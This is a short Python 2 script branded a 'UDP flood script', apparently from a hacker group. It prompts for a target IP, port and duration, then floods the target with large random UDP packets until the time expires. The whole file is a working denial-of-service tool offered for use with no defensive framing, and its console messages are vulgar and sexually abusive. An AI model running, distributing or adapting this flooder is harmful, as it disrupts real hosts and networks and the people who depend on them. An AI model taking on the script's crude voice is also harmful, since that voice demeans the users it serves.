#!/usr/bin/python
#####################################################
#            |WAB| UDP FLOOD SCRIPT v1.0            #
#####################################################
#                                                   #
#               *                   *               #
#             **                     **             #
#            ***                     ***            #
#           *****                   *****           #
#           ************     ************           #
#           ***** ******** ******** *****         	#
#           **** ******************* ****           #
#           **** ***  * ***** *  *** ****           #
#            ***  *      ***      *  ***            #
#             ***         *         ***             #
#              **                   **              #
#               *                   *               #
#                                                   #
#####################################################
#     (c) Copyright 2019 |WAB| EVOLUTION HACKERS    #
#####################################################
import socket, random, sys, time, os
def FUCKING():
	clear = lambda: os.system('clear')
	clear()
	x = """\033[0m
                *                   *
              **                     **
             ***                     ***
            *****                   *****
            ************     ************
            ***** ******** ******** *****
            **** ******************* ****
            **** ***  * ***** *  *** ****
             ***  *      ***      *  ***
              ***         *         ***
               **                   **
                *                   *
        ____________________________________
  """
	print(x)
	ip = raw_input("\033[31m   IP: \033[0m")
	port = int(raw_input("\033[31m   PORT: \033[0m"))
	dur = int(raw_input("\033[31m   TIME: \033[0m"))
	randport=(True,False)[port==0]
	clock=(lambda:0,time.clock)[dur>0]
	duration=(1,(clock()+dur))[dur>0]
	print('\n   IM FUCKING \033[31m%s \033[0mIN ANAL WITH PORT \033[31m%s \n   \033[0mPLEASE WAIT \033[31m%s \033[0mSECONDS TO MAKE ME CUM\n'%(ip,port,dur or 'TOO MUCH'))
	sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	bytes=random._urandom(15000)
	while True:
		port=(random.randint(1,15000000),port)[randport]
		if clock()<duration:
			sock.sendto(bytes,(ip,port))
		else:
			break
	clear()
	print(x)
	print('         \033[31mIM DONE BRO, GIVE ME NEXT BITCH <3\n')
FUCKING()